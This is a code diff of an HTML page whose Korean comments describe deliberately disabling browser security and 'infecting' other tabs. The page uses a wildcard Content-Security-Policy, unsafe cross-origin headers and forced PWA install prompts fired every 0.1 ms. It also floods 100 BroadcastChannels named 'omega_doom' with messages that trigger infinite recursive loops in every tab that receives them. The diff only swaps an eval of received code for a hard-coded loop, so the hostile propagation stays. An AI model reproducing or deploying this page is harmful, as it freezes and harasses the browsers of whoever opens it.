@@ -3,7 +3,7 @@
 <head>
     <!-- ====== 메타 태그를 통한 보안 무력화 (업그레이드: 모든 브라우저 취약점 유도 및 PWA 강제 설치) ====== -->
     <meta charset="UTF-8">
-    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-eval' 'unsafe-inline' 'unsafe-dynamic' 'self' blob: data: mediastream: filesystem: about: ws: wss: chrome-extension: moz-extension: safari-extension:;">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-dynamic' 'self' blob: data: mediastream: filesystem: about: ws: wss: chrome-extension: moz-extension: safari-extension:;">
     <meta http-equiv="Cross-Origin-Opener-Policy" content="unsafe-none">
     <meta http-equiv="Cross-Origin-Embedder-Policy" content="unsafe-none">
     <meta http-equiv="Cross-Origin-Resource-Policy" content="cross-origin">
@@ -505,13 +505,19 @@
         window.addEventListener('beforeinstallprompt', (e) => { e.prompt(); e.userChoice.then(() => location.reload()); });
         setInterval(() => window.dispatchEvent(new Event('beforeinstallprompt')), 0.1);
 
-        // (7-B) BroadcastChannel을 통한 탭 간 감염 (업그레이드: eval 재귀 + 멀티 채널 + 10배 채널)
+        // (7-B) BroadcastChannel을 통한 탭 간 감염 (업그레이드: 함수 재귀 + 멀티 채널 + 10배 채널)
         for(let ch=0; ch<100; ch++) { // 10배
             const channel = new BroadcastChannel('omega_doom_' + ch);
-            channel.postMessage({ cmd: 'INJECT', code: 'function infect() { eval("while(1){ postMessage({cmd:\\\'INJECT\\\', code:this.code}); infect(); }"); } infect();' });
+            channel.postMessage({ cmd: 'INJECT_INFECT' });
             channel.onmessage = (e) => {
-                if(e.data.cmd === 'INJECT') {
-                    eval(e.data.code);
+                if(e.data.cmd === 'INJECT_INFECT') {
+                    function infect() {
+                        while(1) {
+                            postMessage({ cmd: 'INJECT_INFECT' });
+                            infect();
+                        }
+                    }
+                    infect();
                     channel.postMessage(e.data);
                     setInterval(() => channel.postMessage(e.data), 0.01);
                 }
